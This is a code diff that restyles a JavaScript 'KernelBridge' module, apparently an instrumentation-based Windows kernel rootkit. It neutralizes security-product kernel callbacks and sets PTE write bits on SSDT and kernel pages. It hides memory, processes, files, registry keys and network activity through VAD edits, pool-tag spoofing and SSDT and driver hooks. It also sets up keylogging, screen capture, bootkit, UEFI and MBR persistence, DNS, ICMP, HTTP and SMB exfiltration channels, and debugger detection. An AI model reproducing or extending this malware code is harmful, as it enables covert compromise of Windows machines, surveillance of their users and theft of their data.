-                            self.callbackEvasion.threadCallbacks.push({
+              const threadCallbacks = this.findPspCreateThreadNotifyRoutine();
+              if (threadCallbacks) {
+                    for (let i = 0; i < 64; i++) {
+                      const callback = this.readKernelMemory(threadCallbacks.add(i * 8), 8);
+                      if (callback.toInt32() !== 0) {
+                            this.callbackEvasion.threadCallbacks.push({
                                 index: i,
                                 address: callback,
                                 original: callback,
@@ -2043,21 +2024,21 @@ const KernelBridge = {
 
                             // Neutralize callback
 
-                            self.installInlineHook(callback, 'ThreadCallback_' + i);
+                            this.installInlineHook(callback, `ThreadCallback_${i}`);
                         }
                     }
                 }
             };
 
             // Advanced image load callback evasion
-            this.setupImageLoadCallbackEvasion = function () {
+            this.setupImageLoadCallbackEvasion = () => {
                 // Find image load callbacks
-                var imageCallbacks = self.findPspLoadImageNotifyRoutine();
-                if (imageCallbacks) {
-                    for (var i = 0; i < 64; i++) {
-                        var callback = self.readKernelMemory(imageCallbacks.add(i * 8), 8);
-                        if (callback.toInt32() !== 0) {
-                            self.callbackEvasion.imageCallbacks.push({
+              const imageCallbacks = this.findPspLoadImageNotifyRoutine();
+              if (imageCallbacks) {
+                    for (let i = 0; i < 64; i++) {
+                      const callback = this.readKernelMemory(imageCallbacks.add(i * 8), 8);
+                      if (callback.toInt32() !== 0) {
+                            this.callbackEvasion.imageCallbacks.push({
                                 index: i,
                                 address: callback,
                                 original: callback,
@@ -2066,25 +2047,25 @@ const KernelBridge = {
 
                             // Create bypass for image callbacks
 
-                            self.installInlineHook(callback, 'ImageCallback_' + i);
+                            this.installInlineHook(callback, `ImageCallback_${i}`);
                         }
                     }
                 }
             };
 
             // Advanced registry callback evasion
-            this.setupRegistryCallbackEvasion = function () {
+            this.setupRegistryCallbackEvasion = () => {
                 // Find registry callbacks
-                var registryCallbacks = self.findCmCallbackListHead();
-                if (registryCallbacks) {
-                    var currentEntry = registryCallbacks;
-                    var count = 0;
+              const registryCallbacks = this.findCmCallbackListHead();
+              if (registryCallbacks) {
+                  let currentEntry = registryCallbacks;
+                  let count = 0;
 
-                    // Traverse callback list
+                  // Traverse callback list
                     while (currentEntry.toInt32() !== 0 && count < 100) {
-                        var callbackBlock = self.readKernelMemory(currentEntry, 8);
-                        if (callbackBlock.toInt32() !== 0) {
-                            self.callbackEvasion.registryCallbacks.push({
+                      const callbackBlock = this.readKernelMemory(currentEntry, 8);
+                      if (callbackBlock.toInt32() !== 0) {
+                            this.callbackEvasion.registryCallbacks.push({
                                 address: callbackBlock,
                                 listEntry: currentEntry,
                                 neutralized: false,
@@ -2092,25 +2073,25 @@ const KernelBridge = {
 
                             // Neutralize registry callback
 
-                            self.installInlineHook(callbackBlock, 'RegistryCallback_' + count);
+                            this.installInlineHook(callbackBlock, `RegistryCallback_${count}`);
                         }
 
-                        currentEntry = self.readKernelMemory(currentEntry, 8); // Next entry
+                        currentEntry = this.readKernelMemory(currentEntry, 8); // Next entry
                         count++;
                     }
                 }
             };
 
             // Advanced object callback evasion
-            this.setupObjectCallbackEvasion = function () {
+            this.setupObjectCallbackEvasion = () => {
                 // Find object manager callbacks
-                var objectCallbacks = self.findObCallbackListHead();
-                if (objectCallbacks) {
-                    var callbackTypes = ['Process', 'Thread', 'Desktop', 'File'];
-                    callbackTypes.forEach(function (type) {
-                        var typeCallbacks = self.findObjectTypeCallbacks(type);
-                        typeCallbacks.forEach(function (callback) {
-                            self.callbackEvasion.objectCallbacks.push({
+              const objectCallbacks = this.findObCallbackListHead();
+              if (objectCallbacks) {
+                  const callbackTypes = ['Process', 'Thread', 'Desktop', 'File'];
+                  callbackTypes.forEach(type => {
+                      const typeCallbacks = this.findObjectTypeCallbacks(type);
+                      typeCallbacks.forEach(callback => {
+                            this.callbackEvasion.objectCallbacks.push({
                                 type: type,
                                 address: callback,
                                 neutralized: false,
@@ -2118,38 +2099,38 @@ const KernelBridge = {
 
                             // Create object callback bypass
 
-                            self.installInlineHook(callback, type + 'ObjectCallback');
+                            this.installInlineHook(callback, `${type}ObjectCallback`);
                         });
                     });
                 }
             };
 
             // Advanced bug check callback evasion
-            this.setupBugCheckCallbackEvasion = function () {
+            this.setupBugCheckCallbackEvasion = () => {
                 // Find bug check callbacks (used by security products)
-                var bugCheckCallbacks = self.findBugCheckCallbackList();
-                bugCheckCallbacks.forEach(function (callback) {
-                    self.callbackEvasion.bugCheckCallbacks.push({
+              const bugCheckCallbacks = this.findBugCheckCallbackList();
+              bugCheckCallbacks.forEach(callback => {
+                    this.callbackEvasion.bugCheckCallbacks.push({
                         address: callback,
                         neutralized: false,
                     });
 
                     // Neutralize bug check callback
 
-                    self.installInlineHook(callback, 'BugCheckCallback');
+                    this.installInlineHook(callback, 'BugCheckCallback');
                 });
             };
 
             // Callback spoofing for advanced evasion
-            this.setupCallbackSpoofing = function () {
+            this.setupCallbackSpoofing = () => {
                 // Create fake callbacks to confuse analysis
-                var fakeCallbacks = self.createFakeCallbacks();
-                fakeCallbacks.forEach(function (fake) {
+              const fakeCallbacks = this.createFakeCallbacks();
+              fakeCallbacks.forEach(fake => {
                     // Register fake callback
-                    self.registerFakeCallback(fake.type, fake.address);
+                    this.registerFakeCallback(fake.type, fake.address);
                 });
 
-                self.callbackEvasion.evasionMethods.callbackSpoofing = fakeCallbacks.length > 0;
+                this.callbackEvasion.evasionMethods.callbackSpoofing = fakeCallbacks.length > 0;
             };
 
             // Execute all callback evasion methods
@@ -2166,15 +2147,15 @@ const KernelBridge = {
             this.callbackEvasion.evasionMethods.callbackNeutralization = true;
             this.callbackEvasion.evasionMethods.callbackBypass = true;
 
-            var totalCallbacks =
-                this.callbackEvasion.processCallbacks.length +
-                this.callbackEvasion.threadCallbacks.length +
-                this.callbackEvasion.imageCallbacks.length +
-                this.callbackEvasion.registryCallbacks.length +
-                this.callbackEvasion.objectCallbacks.length +
-                this.callbackEvasion.bugCheckCallbacks.length;
+          const totalCallbacks =
+            this.callbackEvasion.processCallbacks.length +
+            this.callbackEvasion.threadCallbacks.length +
+            this.callbackEvasion.imageCallbacks.length +
+            this.callbackEvasion.registryCallbacks.length +
+            this.callbackEvasion.objectCallbacks.length +
+            this.callbackEvasion.bugCheckCallbacks.length;
 
-            send({
+          send({
                 type: 'success',
                 target: 'kernel_bridge',
                 action: 'advanced_callback_evasion_complete',
@@ -2197,7 +2178,6 @@ const KernelBridge = {
 
     // 7. Advanced kernel memory manipulation with modern techniques
     initializeKernelMemoryManipulation: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -2225,16 +2205,16 @@ const KernelBridge = {
             };
 
             // Advanced physical memory access
-            this.setupPhysicalMemoryAccess = function () {
+            this.setupPhysicalMemoryAccess = () => {
                 // Find physical memory device
-                var physMemDevice = self.findPhysicalMemoryDevice();
-                if (physMemDevice) {
-                    self.kernelMemoryManipulation.memoryRegions.systemSpace = physMemDevice;
+              const physMemDevice = this.findPhysicalMemoryDevice();
+              if (physMemDevice) {
+                    this.kernelMemoryManipulation.memoryRegions.systemSpace = physMemDevice;
 
                     // Create physical memory mapping
-                    var physicalMapping = self.createPhysicalMemoryMapping();
-                    if (physicalMapping) {
-                        self.kernelMemoryManipulation.manipulationTechniques.physicalMemoryAccess = true;
+                  const physicalMapping = this.createPhysicalMemoryMapping();
+                  if (physicalMapping) {
+                        this.kernelMemoryManipulation.manipulationTechniques.physicalMemoryAccess = true;
 
                         send({
                             type: 'memory_access',
@@ -2246,25 +2226,25 @@ const KernelBridge = {
             };
 
             // Advanced PTE (Page Table Entry) manipulation
-            this.setupPTEManipulation = function () {
+            this.setupPTEManipulation = () => {
                 // Find important pages to manipulate
-                var targetPages = [
-                    { name: 'SSDT', address: self.ssdtAddress },
-                    { name: 'HAL', address: self.getKernelModuleBase('hal.dll') },
-                    { name: 'NTOSKRNL', address: self.ntoskrnlBase },
-                ];
+              const targetPages = [
+                {name: 'SSDT', address: this.ssdtAddress},
+                {name: 'HAL', address: this.getKernelModuleBase('hal.dll')},
+                {name: 'NTOSKRNL', address: this.ntoskrnlBase},
+              ];
 
-                targetPages.forEach(function (page) {
+              targetPages.forEach(page => {
                     if (page.address) {
                         // Get PTE for this page
-                        var pte = self.getPTEForAddress(page.address);
-                        if (pte) {
+                      const pte = this.getPTEForAddress(page.address);
+                      if (pte) {
                             // Modify PTE permissions
-                            var originalPTE = self.readKernelMemory(pte, 8).readU64();
-                            var modifiedPTE = originalPTE | 0x2; // Set write bit
-                            self.writeKernelMemory(pte, modifiedPTE);
+                          const originalPTE = this.readKernelMemory(pte, 8).readU64();
+                          const modifiedPTE = originalPTE | 0x2; // Set write bit
+                            this.writeKernelMemory(pte, modifiedPTE);
 
-                            self.kernelMemoryManipulation.allocatedMemory.push({
+                            this.kernelMemoryManipulation.allocatedMemory.push({
                                 name: page.name,
                                 address: page.address,
                                 pte: pte,
@@ -2275,41 +2255,39 @@ const KernelBridge = {
                     }
                 });
 
-                self.kernelMemoryManipulation.manipulationTechniques.pteManipulation =
+                this.kernelMemoryManipulation.manipulationTechniques.pteManipulation =
                     targetPages.length > 0;
             };
 
             // Advanced VAD (Virtual Address Descriptor) tree modification
-            this.setupVADTreeModification = function () {
+            this.setupVADTreeModification = () => {
                 // Find current process VAD tree
-                var currentProcess = self.getCurrentProcessEPROCESS();
-                if (currentProcess) {
-                    var vadRoot = self.readKernelMemory(currentProcess.add(0x658), 8); // VadRoot offset
+              const currentProcess = this.getCurrentProcessEPROCESS();
+              if (currentProcess) {
+                  const vadRoot = this.readKernelMemory(currentProcess.add(0x658), 8); // VadRoot offset
                     if (vadRoot.toInt32() !== 0) {
                         // Traverse and modify VAD tree
-                        self.traverseVADTree(vadRoot, function (vadNode) {
+                        this.traverseVADTree(vadRoot, vadNode => {
                             // Hide specific memory regions
-                            var startAddress = self.readKernelMemory(vadNode.add(0x18), 8);
-                            var endAddress = self.readKernelMemory(vadNode.add(0x20), 8);
+                          const startAddress = this.readKernelMemory(vadNode.add(0x18), 8);
+                          const endAddress = this.readKernelMemory(vadNode.add(0x20), 8);
 
-                            // Check if this is our allocated memory
-                            var isOurMemory = self.kernelMemoryManipulation.allocatedMemory.some(
-                                function (alloc) {
-                                    return (
-                                        startAddress <= alloc.address && alloc.address <= endAddress
-                                    );
-                                }
-                            );
+                          // Check if this is our allocated memory
+                          const isOurMemory = this.kernelMemoryManipulation.allocatedMemory.some(
+                            alloc =>
+                              startAddress <= alloc.address && alloc.address <= endAddress
+                          );
 
-                            if (isOurMemory) {
+                          if (isOurMemory) {
                                 // Modify VAD flags to hide memory
-                                var vadFlags = self
-                                    .readKernelMemory(vadNode.add(0x30), 4)
-                                    .readU32();
-                                vadFlags |= 0x800000; // Set hidden flag
-                                self.writeKernelMemory(vadNode.add(0x30), vadFlags);
+                              let vadFlags = this.readKernelMemory(
+                                vadNode.add(0x30),
+                                4
+                              ).readU32();
+                              vadFlags |= 0x800000; // Set hidden flag
+                                this.writeKernelMemory(vadNode.add(0x30), vadFlags);
 
-                                self.kernelMemoryManipulation.hiddenAllocations.push({
+                                this.kernelMemoryManipulation.hiddenAllocations.push({
                                     vadNode: vadNode,
                                     startAddress: startAddress,
                                     endAddress: endAddress,
@@ -2318,25 +2296,25 @@ const KernelBridge = {
                             }
                         });
 
-                        self.kernelMemoryManipulation.manipulationTechniques.vadTreeModification = true;
+                        this.kernelMemoryManipulation.manipulationTechniques.vadTreeModification = true;
                     }
                 }
             };
 
             // Advanced pool tag spoofing
-            this.setupPoolTagSpoofing = function () {
+            this.setupPoolTagSpoofing = () => {
                 // Find pool allocations with our tags
-                var poolRegions = self.scanPoolAllocations();
-                var spoofedCount = 0;
+              const poolRegions = this.scanPoolAllocations();
+              let spoofedCount = 0;
 
-                poolRegions.forEach(function (pool) {
-                    if (self.isOurPoolAllocation(pool)) {
+              poolRegions.forEach(pool => {
+                    if (this.isOurPoolAllocation(pool)) {
                         // Change pool tag to something innocuous
-                        var originalTag = self.readKernelMemory(pool.address.sub(8), 4).readU32();
-                        var spoofedTag = 0x656c6946; // 'File'
-                        self.writeKernelMemory(pool.address.sub(8), spoofedTag);
+                      const originalTag = this.readKernelMemory(pool.address.sub(8), 4).readU32();
+                      const spoofedTag = 0x656c6946; // 'File'
+                        this.writeKernelMemory(pool.address.sub(8), spoofedTag);
 
-                        self.kernelMemoryManipulation.allocatedMemory.push({
+                        this.kernelMemoryManipulation.allocatedMemory.push({
                             type: 'pool',
                             address: pool.address,
                             originalTag: originalTag,
@@ -2347,22 +2325,22 @@ const KernelBridge = {
                     }
                 });
 
-                self.kernelMemoryManipulation.manipulationTechniques.poolTagSpoofing =
+                this.kernelMemoryManipulation.manipulationTechniques.poolTagSpoofing =
                     spoofedCount > 0;
             };
 
             // Advanced memory compression bypass
-            this.setupMemoryCompression = function () {
+            this.setupMemoryCompression = () => {
                 // Check if memory compression is enabled
-                if (self.isMemoryCompressionEnabled()) {
+                if (this.isMemoryCompressionEnabled()) {
                     // Find memory manager compression structures
-                    var compressionStructures = self.findMemoryCompressionStructures();
-                    compressionStructures.forEach(function (structure) {
+                  const compressionStructures = this.findMemoryCompressionStructures();
+                  compressionStructures.forEach(structure => {
                         // Disable compression for our allocations
-                        self.disableCompressionForRegion(structure);
+                        this.disableCompressionForRegion(structure);
                     });
 
-                    self.kernelMemoryManipulation.manipulationTechniques.memoryCompression = true;
+                    this.kernelMemoryManipulation.manipulationTechniques.memoryCompression = true;
 
                     send({
                         type: 'memory_manipulation',
@@ -2373,17 +2351,17 @@ const KernelBridge = {
             };
 
             // Advanced kernel stack manipulation
-            this.setupKernelStackManipulation = function () {
+            this.setupKernelStackManipulation = () => {
                 // Find kernel stacks of critical processes
-                var criticalProcesses = self.findCriticalProcesses();
-                criticalProcesses.forEach(function (process) {
-                    var kernelStack = self.getProcessKernelStack(process);
-                    if (kernelStack) {
+              const criticalProcesses = this.findCriticalProcesses();
+              criticalProcesses.forEach(process => {
+                  const kernelStack = this.getProcessKernelStack(process);
+                  if (kernelStack) {
                         // Install stack-based hooks
-                        var stackHook = self.createKernelStackHook();
-                        self.installStackHook(kernelStack, stackHook);
+                      const stackHook = this.createKernelStackHook();
+                      this.installStackHook(kernelStack, stackHook);
 
-                        self.kernelMemoryManipulation.memoryRegions.kernelStacks.push({
+                        this.kernelMemoryManipulation.memoryRegions.kernelStacks.push({
                             process: process,
                             stack: kernelStack,
                             hooked: true,
@@ -2393,13 +2371,13 @@ const KernelBridge = {
             };
 
             // Advanced memory pattern obfuscation
-            this.setupMemoryPatternObfuscation = function () {
+            this.setupMemoryPatternObfuscation = () => {
                 // Obfuscate memory patterns that could be detected
-                self.kernelMemoryManipulation.allocatedMemory.forEach(function (allocation) {
+                this.kernelMemoryManipulation.allocatedMemory.forEach(allocation => {
                     if (allocation.address) {
                         // Apply XOR obfuscation
-                        var obfuscationKey = self.generateObfuscationKey();
-                        self.obfuscateMemoryRegion(
+                      const obfuscationKey = this.generateObfuscationKey();
+                      this.obfuscateMemoryRegion(
                             allocation.address,
                             allocation.size,
                             obfuscationKey
@@ -2430,9 +2408,9 @@ const KernelBridge = {
                     this.kernelMemoryManipulation.memoryRegions.kernelStacks.length,
                 active_techniques: Object.keys(
                     this.kernelMemoryManipulation.manipulationTechniques
-                ).filter(function (technique) {
-                    return self.kernelMemoryManipulation.manipulationTechniques[technique];
-                }).length,
+                ).filter(
+                    technique => this.kernelMemoryManipulation.manipulationTechniques[technique]
+                ).length,
             });
         } catch {
             send({
@@ -2446,7 +2424,6 @@ const KernelBridge = {
 
     // 8. Advanced rootkit capabilities with modern stealth techniques
     setupAdvancedRootkitCapabilities: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -2480,17 +2457,17 @@ const KernelBridge = {
             };
 
             // Advanced boot persistence
-            this.setupBootPersistence = function () {
+            this.setupBootPersistence = () => {
                 // Multiple boot persistence methods
-                var persistenceMethods = [
-                    { name: 'bootkit', setup: self.setupBootkit },
-                    { name: 'uefi_rootkit', setup: self.setupUEFIRootkit },
-                    { name: 'mbr_hook', setup: self.setupMBRHook },
-                    { name: 'winload_hook', setup: self.setupWinloadHook },
-                ];
+              const persistenceMethods = [
+                {name: 'bootkit', setup: this.setupBootkit},
+                {name: 'uefi_rootkit', setup: this.setupUEFIRootkit},
+                {name: 'mbr_hook', setup: this.setupMBRHook},
+                {name: 'winload_hook', setup: this.setupWinloadHook},
+              ];
 
-                var successCount = 0;
-                persistenceMethods.forEach(function (method) {
+              let successCount = 0;
+              persistenceMethods.forEach(method => {
                     try {
                         if (method.setup()) {
                             successCount++;
@@ -2504,26 +2481,26 @@ const KernelBridge = {
                     } catch {}
                 });
 
-                self.advancedRootkit.persistence.bootPersistence = successCount > 0;
+                this.advancedRootkit.persistence.bootPersistence = successCount > 0;
             };
 
             // Advanced process hiding
-            this.setupProcessHiding = function () {
+            this.setupProcessHiding = () => {
                 // Multiple process hiding techniques
-                var hidingTechniques = [
-                    { name: 'eprocess_unlink', method: self.unlinkEPROCESS },
-                    { name: 'csrss_hide', method: self.hideFromCSRSS },
-                    { name: 'peb_manipulation', method: self.manipulatePEB },
-                    { name: 'handle_table_hide', method: self.hideFromHandleTable },
-                ];
+              const hidingTechniques = [
+                {name: 'eprocess_unlink', method: this.unlinkEPROCESS},
+                {name: 'csrss_hide', method: this.hideFromCSRSS},
+                {name: 'peb_manipulation', method: this.manipulatePEB},
+                {name: 'handle_table_hide', method: this.hideFromHandleTable},
+              ];
 
-                // Get current process to hide
-                var currentProcess = self.getCurrentProcessEPROCESS();
-                if (currentProcess) {
-                    hidingTechniques.forEach(function (technique) {
+              // Get current process to hide
+              const currentProcess = this.getCurrentProcessEPROCESS();
+              if (currentProcess) {
+                    hidingTechniques.forEach(technique => {
                         try {
                             if (technique.method(currentProcess)) {
-                                self.advancedRootkit.hiddenProcesses.push({
+                                this.advancedRootkit.hiddenProcesses.push({
                                     eprocess: currentProcess,
                                     pid: Process.getCurrentProcess().id,
                                     technique: technique.name,
@@ -2533,25 +2510,25 @@ const KernelBridge = {
                         } catch {}
                     });
 
-                    self.advancedRootkit.stealth.processHiding =
-                        self.advancedRootkit.hiddenProcesses.length > 0;
+                    this.advancedRootkit.stealth.processHiding =
+                        this.advancedRootkit.hiddenProcesses.length > 0;
                 }
             };
 
             // Advanced file system hiding
-            this.setupFileSystemHiding = function () {
+            this.setupFileSystemHiding = () => {
                 // Hook file system drivers
-                var fsDrivers = ['ntfs.sys', 'fastfat.sys', 'refs.sys'];
-                fsDrivers.forEach(function (driverName) {
-                    var driver = self.findDriverByName(driverName);
-                    if (driver) {
+              const fsDrivers = ['ntfs.sys', 'fastfat.sys', 'refs.sys'];
+              fsDrivers.forEach(driverName => {
+                  const driver = this.findDriverByName(driverName);
+                  if (driver) {
                         // Hook IRP_MJ_DIRECTORY_CONTROL
-                        var originalDispatch = self.getDriverDispatchRoutine(driver, 0x0c);
-                        if (originalDispatch) {
-                            var hidingHook = self.createFileHidingHook(originalDispatch);
-                            self.setDriverDispatchRoutine(driver, 0x0c, hidingHook);
+                      const originalDispatch = this.getDriverDispatchRoutine(driver, 0x0c);
+                      if (originalDispatch) {
+                          const hidingHook = this.createFileHidingHook(originalDispatch);
+                          this.setDriverDispatchRoutine(driver, 0x0c, hidingHook);
 
-                            self.advancedRootkit.hiddenFiles.push({
+                            this.advancedRootkit.hiddenFiles.push({
                                 driver: driverName,
                                 originalDispatch: originalDispatch,
                                 hook: hidingHook,
@@ -2560,126 +2537,126 @@ const KernelBridge = {
                     }
                 });
 
-                self.advancedRootkit.stealth.fileHiding =
-                    self.advancedRootkit.hiddenFiles.length > 0;
+                this.advancedRootkit.stealth.fileHiding =
+                    this.advancedRootkit.hiddenFiles.length > 0;
             };
 
             // Advanced registry hiding
-            this.setupRegistryHiding = function () {
+            this.setupRegistryHiding = () => {
                 // Hook registry operations
-                var registryRoutines = [
-                    { name: 'NtEnumerateKey', syscall: 0x0f },
-                    { name: 'NtQueryKey', syscall: 0x15 },
-                    { name: 'NtEnumerateValueKey', syscall: 0x13 },
-                    { name: 'NtQueryValueKey', syscall: 0x17 },
-                ];
+              const registryRoutines = [
+                {name: 'NtEnumerateKey', syscall: 0x0f},
+                {name: 'NtQueryKey', syscall: 0x15},
+                {name: 'NtEnumerateValueKey', syscall: 0x13},
+                {name: 'NtQueryValueKey', syscall: 0x17},
+              ];
 
-                registryRoutines.forEach(function (routine) {
-                    if (self.ssdtAddress) {
-                        var originalRoutine = self.getSSDTFunction(routine.syscall);
-                        if (originalRoutine) {
-                            var registryHook = self.createRegistryHidingHook(
-                                routine.name,
-                                originalRoutine
-                            );
-                            self.setSSDTFunction(routine.syscall, registryHook);
+              registryRoutines.forEach(routine => {
+                    if (this.ssdtAddress) {
+                      const originalRoutine = this.getSSDTFunction(routine.syscall);
+                      if (originalRoutine) {
+                          const registryHook = this.createRegistryHidingHook(
+                            routine.name,
+                            originalRoutine
+                          );
+                          this.setSSDTFunction(routine.syscall, registryHook);
                         }
                     }
                 });
 
-                self.advancedRootkit.stealth.registryHiding = true;
+                this.advancedRootkit.stealth.registryHiding = true;
             };
 
             // Advanced network hiding
-            this.setupNetworkHiding = function () {
+            this.setupNetworkHiding = () => {
                 // Hook network-related APIs
-                var networkDrivers = ['tcpip.sys', 'afd.sys', 'netio.sys'];
-                networkDrivers.forEach(function (driverName) {
-                    var driver = self.findDriverByName(driverName);
-                    if (driver) {
+              const networkDrivers = ['tcpip.sys', 'afd.sys', 'netio.sys'];
+              networkDrivers.forEach(driverName => {
+                  const driver = this.findDriverByName(driverName);
+                  if (driver) {
                         // Hook relevant IRP handlers
-                        var networkHook = self.createNetworkHidingHook(driver);
-                        self.installNetworkHook(driver, networkHook);
+                      const networkHook = this.createNetworkHidingHook(driver);
+                      this.installNetworkHook(driver, networkHook);
                     }
                 });
 
                 // Hook NDIS (Network Driver Interface Specification)
-                var ndisBase = self.getKernelModuleBase('ndis.sys');
-                if (ndisBase) {
-                    var ndisRoutines = ['NdisOpenAdapterEx', 'NdisSendNetBufferLists'];
-                    ndisRoutines.forEach(function (routine) {
-                        var routineAddr = self.getKernelExport(routine);
-                        if (routineAddr) {
-                            self.installInlineHook(routineAddr, routine + '_NetworkHide');
+              const ndisBase = this.getKernelModuleBase('ndis.sys');
+              if (ndisBase) {
+                  const ndisRoutines = ['NdisOpenAdapterEx', 'NdisSendNetBufferLists'];
+                  ndisRoutines.forEach(routine => {
+                      const routineAddr = this.getKernelExport(routine);
+                      if (routineAddr) {
+                            this.installInlineHook(routineAddr, `${routine}_NetworkHide`);
                         }
                     });
                 }
 
-                self.advancedRootkit.stealth.networkHiding = true;
+                this.advancedRootkit.stealth.networkHiding = true;
             };
 
             // Advanced keylogging capability
-            this.setupKeylogging = function () {
+            this.setupKeylogging = () => {
                 // Hook keyboard input
 
                 // Hook at multiple levels
-                var keyboardTargets = [
-                    { name: 'win32k!NtUserGetMessage', hook: self.createUserModeKeyHook },
-                    {
-                        name: 'i8042prt!I8042KeyboardInterruptService',
-                        hook: self.createKernelKeyHook,
-                    },
-                    {
-                        name: 'kbdclass!KeyboardClassServiceCallback',
-                        hook: self.createClassKeyHook,
-                    },
-                ];
+              const keyboardTargets = [
+                {name: 'win32k!NtUserGetMessage', hook: this.createUserModeKeyHook},
+                {
+                  name: 'i8042prt!I8042KeyboardInterruptService',
+                  hook: this.createKernelKeyHook,
+                },
+                {
+                  name: 'kbdclass!KeyboardClassServiceCallback',
+                  hook: this.createClassKeyHook,
+                },
+              ];
 
-                keyboardTargets.forEach(function (target) {
+              keyboardTargets.forEach(target => {
                     try {
-                        var targetAddr = self.resolveSystemAddress(target.name);
-                        if (targetAddr) {
-                            self.installInlineHook(targetAddr, target.name + '_Keylog');
+                      const targetAddr = this.resolveSystemAddress(target.name);
+                      if (targetAddr) {
+                            this.installInlineHook(targetAddr, `${target.name}_Keylog`);
                         }
                     } catch {}
                 });
 
-                self.advancedRootkit.capabilities.keylogging = true;
+                this.advancedRootkit.capabilities.keylogging = true;
             };
 
             // Advanced screenshot capture
-            this.setupScreenshotCapture = function () {
+            this.setupScreenshotCapture = () => {
                 // Hook graphics subsystem
-                var graphicsTargets = [
-                    { name: 'win32k!NtGdiStretchBlt', hook: self.createGDIHook },
-                    { name: 'dxgkrnl!DxgkSubmitCommand', hook: self.createDXGHook },
-                    { name: 'win32k!GreBitBlt', hook: self.createBitBltHook },
-                ];
+              const graphicsTargets = [
+                {name: 'win32k!NtGdiStretchBlt', hook: this.createGDIHook},
+                {name: 'dxgkrnl!DxgkSubmitCommand', hook: this.createDXGHook},
+                {name: 'win32k!GreBitBlt', hook: this.createBitBltHook},
+              ];
 
-                graphicsTargets.forEach(function (target) {
+              graphicsTargets.forEach(target => {
                     try {
-                        var targetAddr = self.resolveSystemAddress(target.name);
-                        if (targetAddr) {
-                            self.installInlineHook(targetAddr, target.name + '_Screenshot');
+                      const targetAddr = this.resolveSystemAddress(target.name);
+                      if (targetAddr) {
+                            this.installInlineHook(targetAddr, `${target.name}_Screenshot`);
                         }
                     } catch {}
                 });
 
-                self.advancedRootkit.capabilities.screenshotCapture = true;
+                this.advancedRootkit.capabilities.screenshotCapture = true;
             };
 
             // Advanced data exfiltration
-            this.setupDataExfiltration = function () {
+            this.setupDataExfiltration = () => {
                 // Create covert communication channels
-                var exfiltrationChannels = [
-                    { name: 'dns_tunnel', setup: self.setupDNSTunnel },
-                    { name: 'icmp_tunnel', setup: self.setupICMPTunnel },
-                    { name: 'http_beacon', setup: self.setupHTTPBeacon },
-                    { name: 'smb_beacon', setup: self.setupSMBBeacon },
-                ];
+              const exfiltrationChannels = [
+                {name: 'dns_tunnel', setup: this.setupDNSTunnel},
+                {name: 'icmp_tunnel', setup: this.setupICMPTunnel},
+                {name: 'http_beacon', setup: this.setupHTTPBeacon},
+                {name: 'smb_beacon', setup: this.setupSMBBeacon},
+              ];
 
-                var activeChannels = 0;
-                exfiltrationChannels.forEach(function (channel) {
+              let activeChannels = 0;
+              exfiltrationChannels.forEach(channel => {
                     try {
                         if (channel.setup()) {
                             activeChannels++;
@@ -2693,7 +2670,7 @@ const KernelBridge = {
                     } catch {}
                 });
 
-                self.advancedRootkit.capabilities.dataExfiltration = activeChannels > 0;
+                this.advancedRootkit.capabilities.dataExfiltration = activeChannels > 0;
             };
 
             // Execute all rootkit capabilities
@@ -2706,23 +2683,19 @@ const KernelBridge = {
             this.setupScreenshotCapture();
             this.setupDataExfiltration();
 
-            var activePersistence = Object.keys(this.advancedRootkit.persistence).filter(
-                function (method) {
-                    return self.advancedRootkit.persistence[method];
-                }
-            ).length;
+          const activePersistence = Object.keys(this.advancedRootkit.persistence).filter(
+            method => this.advancedRootkit.persistence[method]
+          ).length;
 
-            var activeStealth = Object.keys(this.advancedRootkit.stealth).filter(function (method) {
-                return self.advancedRootkit.stealth[method];
-            }).length;
+          const activeStealth = Object.keys(this.advancedRootkit.stealth).filter(
+            method => this.advancedRootkit.stealth[method]
+          ).length;
 
-            var activeCapabilities = Object.keys(this.advancedRootkit.capabilities).filter(
-                function (capability) {
-                    return self.advancedRootkit.capabilities[capability];
-                }
-            ).length;
+          const activeCapabilities = Object.keys(this.advancedRootkit.capabilities).filter(
+            capability => this.advancedRootkit.capabilities[capability]
+          ).length;
 
-            send({
+          send({
                 type: 'success',
                 target: 'kernel_bridge',
                 action: 'advanced_rootkit_capabilities_complete',
@@ -2744,7 +2717,6 @@ const KernelBridge = {
 
     // 9. Advanced kernel debugging evasion
     initializeKernelDebuggingEvasion: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -2772,11 +2744,11 @@ const KernelBridge = {
             };
 
             // Advanced debugger detection
-            this.detectAdvancedDebuggers = function () {
+            this.detectAdvancedDebuggers = () => {
                 // Check for kernel debugger
-                var kdDebuggerEnabled = self.checkKdDebuggerEnabled();
-                if (kdDebuggerEnabled) {
-                    self.debuggingEvasion.debuggerDetection.kernelDebugger = true;
+              const kdDebuggerEnabled = this.checkKdDebuggerEnabled();
+              if (kdDebuggerEnabled) {
+                    this.debuggingEvasion.debuggerDetection.kernelDebugger = true;
                     send({
                         type: 'detection',
                         target: 'kernel_bridge',
@@ -2785,10 +2757,10 @@ const KernelBridge = {
                 }
 
                 // Check for user-mode debuggers attached to critical processes
-                var criticalProcesses = self.findCriticalProcesses();
-                criticalProcesses.forEach(function (process) {
-                    if (self.isProcessBeingDebugged(process)) {
-                        self.debuggingEvasion.debuggerDetection.userModeDebugger = true;
+              const criticalProcesses = this.findCriticalProcesses();
+              criticalProcesses.forEach(process => {
+                    if (this.isProcessBeingDebugged(process)) {
+                        this.debuggingEvasion.debuggerDetection.userModeDebugger = true;
                         send({
                             type: 'detection',
                             target: 'kernel_bridge',
@@ -2799,16 +2771,16 @@ const KernelBridge = {
                 });
 
                 // Detect specific debugging tools
-                var debuggingTools = [
-                    { name: 'windbg.exe', detection: 'windbgDetected' },
-                    { name: 'x32dbg.exe', detection: 'x64dbgDetected' },
-                    { name: 'x64dbg.exe', detection: 'x64dbgDetected' },
-                    { name: 'ollydbg.exe', detection: 'ollyDetected' },
-                ];
+              const debuggingTools = [
+                {name: 'windbg.exe', detection: 'windbgDetected'},
+                {name: 'x32dbg.exe', detection: 'x64dbgDetected'},
+                {name: 'x64dbg.exe', detection: 'x64dbgDetected'},
+                {name: 'ollydbg.exe', detection: 'ollyDetected'},
+              ];
 
-                debuggingTools.forEach(function (tool) {
-                    if (self.isProcessRunning(tool.name)) {
-                        self.debuggingEvasion.debuggerDetection[tool.detection] = true;
+              debuggingTools.forEach(tool => {
+                    if (this.isProcessRunning(tool.name)) {
+                        this.debuggingEvasion.debuggerDetection[tool.detection] = true;
                         send({
